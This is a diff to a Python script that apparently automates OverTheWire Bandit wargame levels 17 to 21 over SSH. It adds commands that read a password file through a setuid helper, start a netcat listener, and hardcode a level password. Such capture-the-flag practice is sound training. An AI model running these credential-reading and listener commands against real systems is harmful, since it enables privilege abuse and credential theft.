@@ -317,36 +317,39 @@ def bandit16_17(client):
 
     return next_user, next_password
 
+# DONE
 def bandit17_18(client):
 
     next_user = "bandit18"
 
     # Process to obtain the password
-    stdin, stdout, stderr = client.exec_command("whoami")
+    stdin, stdout, stderr = client.exec_command("diff passwords.old passwords.new | tail -n 1 | awk 'NF{print $NF}'")
     next_password = stdout.read().decode().strip()
 
     client.close()
 
     return next_user, next_password
 
+# DONE
 def bandit18_19(client):
 
     next_user = "bandit19"
 
     # Process to obtain the password
-    stdin, stdout, stderr = client.exec_command("")
+    stdin, stdout, stderr = client.exec_command("cat readme")
     next_password = stdout.read().decode().strip()
 
     client.close()
 
     return next_user, next_password
 
+# DONE
 def bandit19_20(client):
 
     next_user = "bandit20"
 
     # Process to obtain the password
-    stdin, stdout, stderr = client.exec_command("")
+    stdin, stdout, stderr = client.exec_command("/home/bandit19/bandit20-do cat /etc/bandit_pass/bandit20")
     next_password = stdout.read().decode().strip()
 
     client.close()
@@ -356,10 +359,16 @@ def bandit19_20(client):
 def bandit20_21(client):
 
     next_user = "bandit21"
+    
+    client2 = ssh_connection(user,password)
+    stdin2, stdout2, stderr2 = client2.exec_command("nc -nlvp 4444")
 
     # Process to obtain the password
-    stdin, stdout, stderr = client.exec_command("")
-    next_password = stdout.read().decode().strip()
+    stdin, stdout, stderr = client.exec_command("./suconnect 4444")
+    
+    print(stdout2.read().decode().strip())
+    
+    next_password = 'PENDIENTE'       
 
     client.close()
 
@@ -514,9 +523,9 @@ def printCredentials():
 
 if __name__ == '__main__':
     # DEBUG
-    user = "bandit17"
-    # password = "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx"
-    password = "D:\\Proyectos\\owt_bandit_autopwn\\OWT_Bandit_AutoPwn\\resources\\bandit16_17\\id_rsa"
+    user = "bandit20"
+    password = "0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO"
+    # password = "D:\\Proyectos\\owt_bandit_autopwn\\OWT_Bandit_AutoPwn\\resources\\bandit16_17\\id_rsa"
 
     # user, password = bandit11_12(ssh_connection(user,password))
     # printCredentials()
@@ -536,8 +545,8 @@ if __name__ == '__main__':
     # user, password = bandit16_17(ssh_connection(user,password))
     # printCredentials()
 
-    user, password = bandit17_18(ssh_connection(user,password,use_ssh_key=True,sshkey_file=password))
-    printCredentials()
+    # user, password = bandit17_18(ssh_connection(user,password,use_ssh_key=True,sshkey_file=password))
+    # printCredentials()
 
     # user, password = bandit18_19(ssh_connection(user,password))
     # printCredentials()
@@ -545,8 +554,8 @@ if __name__ == '__main__':
     # user, password = bandit19_20(ssh_connection(user,password))
     # printCredentials()
 
-    # user, password = bandit20_21(ssh_connection(user,password))
-    # printCredentials()
+    user, password = bandit20_21(ssh_connection(user,password))
+    printCredentials()
 
     # user, password = bandit21_22(ssh_connection(user,password))
     # printCredentials()
